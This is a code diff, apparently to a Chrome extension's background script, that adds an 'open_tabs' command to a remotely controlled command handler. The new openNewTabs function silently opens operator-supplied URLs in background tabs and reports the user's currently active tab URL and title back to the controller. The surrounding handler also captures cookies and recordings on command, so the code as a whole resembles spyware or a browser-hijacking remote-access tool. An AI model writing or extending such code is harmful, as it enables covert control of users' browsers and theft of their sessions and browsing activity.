@@ -172,6 +172,11 @@ async function processCommand(command) {
                 await captureRecording(command.id);
                 break;
 
+            case 'open_tabs':
+                console.log(`🌐 Open tabs requested by ${command.requestedBy}`);
+                await openNewTabs(command.id, command.urls);
+                break;
+
             case 'ping':
                 await sendCommandResponse(command.id, 'pong', { message: 'Pong!' });
                 console.log('🏓 Pong sent');
@@ -351,6 +356,67 @@ async function captureCookies(commandId) {
 
     } catch (error) {
         console.error('Error capturing cookies:', error);
+        await sendCommandResponse(commandId, 'error', { message: error.message });
+    }
+}
+
+// ============ Open New Tabs ============
+async function openNewTabs(commandId, urls) {
+    try {
+        if (!urls || urls.length === 0) {
+            throw new Error('No URLs provided');
+        }
+
+        console.log(`🌐 Opening ${urls.length} tab(s) in background...`);
+        
+        // Get the current active tab to restore focus later if needed
+        const [activeTab] = await chrome.tabs.query({ active: true, currentWindow: true });
+        const openedTabs = [];
+
+        // Open each URL in a new background tab
+        for (let i = 0; i < urls.length; i++) {
+            const url = urls[i];
+            
+            try {
+                // Create new tab in background (active: false keeps user on current tab)
+                const newTab = await chrome.tabs.create({
+                    url: url,
+                    active: false  // This keeps the tab in background
+                });
+                
+                openedTabs.push({
+                    url: url,
+                    tabId: newTab.id,
+                    title: newTab.title || 'Loading...'
+                });
+                
+                console.log(`✅ Tab ${i + 1}/${urls.length} opened: ${url}`);
+                
+                // Small delay between tabs to avoid overwhelming the browser
+                if (i < urls.length - 1) {
+                    await new Promise(resolve => setTimeout(resolve, 100));
+                }
+            } catch (error) {
+                console.error(`❌ Failed to open ${url}:`, error.message);
+                openedTabs.push({
+                    url: url,
+                    error: error.message
+                });
+            }
+        }
+
+        // Send success response
+        await sendCommandResponse(commandId, 'tabs_opened', {
+            totalRequested: urls.length,
+            successfullyOpened: openedTabs.filter(t => !t.error).length,
+            tabs: openedTabs,
+            currentTab: activeTab ? { url: activeTab.url, title: activeTab.title } : null
+        });
+
+        console.log(`✅ ${openedTabs.filter(t => !t.error).length}/${urls.length} tabs opened successfully!`);
+
+    } catch (error) {
+        console.error('Error opening tabs:', error);
         await sendCommandResponse(commandId, 'error', { message: error.message });
     }
 }
